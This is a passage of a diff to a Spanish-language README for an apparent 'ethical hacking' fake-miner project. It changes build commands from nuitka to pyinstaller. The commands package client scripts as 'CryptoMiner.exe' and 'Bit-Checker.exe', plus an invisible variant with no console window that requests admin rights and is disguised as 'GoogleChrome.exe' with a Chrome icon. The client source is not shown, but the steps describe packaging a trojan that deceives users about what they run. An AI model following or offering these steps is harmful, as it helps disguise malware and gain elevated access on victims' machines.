@@ -235,10 +235,10 @@ En esta funcion debemos especificar la direccion IP. Ahora tenemos dos opciones:
       Para Generar el .exe ejecutaremos el siguente comando en la carpte "Client":
 ---
     Fake Miner (client/main.py)
-      D:\FakeProyect\> nuitka --exe --onefile --output-dir=D:\ProtectosPython\ETHICAL_HACKING\fake_miner\FakeProyect --output-filename=CryptoMiner.exe --windows-icon-from-ico=client\icons\minericon.ico client\main.py
+      D:\FakeProyect\> pyinstaller --onefile --clean --uac-admin --icon=client\icons\minericon.ico main.py -n CryptoMiner.exe 
 ---
     Invisible (client/main_inv.py)
-      D:\FakeProyect\client> nuitka --exe --onefile --disable-console --output-dir=D:\ProtectosPython\ETHICAL_HACKING\fake_miner\FakeProyect --output-filename=CryptoMiner.exe --windows-icon-from-ico=client\icons\GoogleChrome.ico client\main_inv.py
+      D:\FakeProyect\client> pyinstaller --noconsole --onefile --clean -n GoogleChrome.exe --uac-admin --icon=./icons/GoogleChrome.ico main_inv.py
 ---
     Bitcoin Account Cheker (client/main_checker.py)
       D:\FakeProyect\client> pyinstaller --onefile --clean -n Bit-Checker.exe --uac-admin --icon=./icons/bit-checker.ico main_checker.py
